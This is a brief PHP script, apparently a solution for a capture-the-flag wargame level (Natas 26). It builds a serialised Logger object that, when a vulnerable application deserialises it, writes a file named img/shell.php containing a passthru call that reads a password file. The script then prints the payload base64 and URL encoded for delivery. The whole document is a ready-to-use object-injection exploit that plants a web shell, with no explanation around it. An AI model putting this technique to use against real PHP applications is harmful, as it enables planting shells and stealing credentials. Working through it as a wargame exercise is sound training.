<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct($file)
    {
        // initialise variables
        $this->initMsg="Hello\n";
        $this->exitMsg="Goodbye <? passthru('cat /etc/natas_webpass/natas27'); ?>\n\n";
        $this->logFile = "img/shell.php";
    }
}
$object = new Logger("Security Times");
echo "Serialized Object : ".serialize($object)."<pre>\n\n</pre>Base64 encoded serialized object : ".urlencode(base64_encode(serialize($object)));
?>
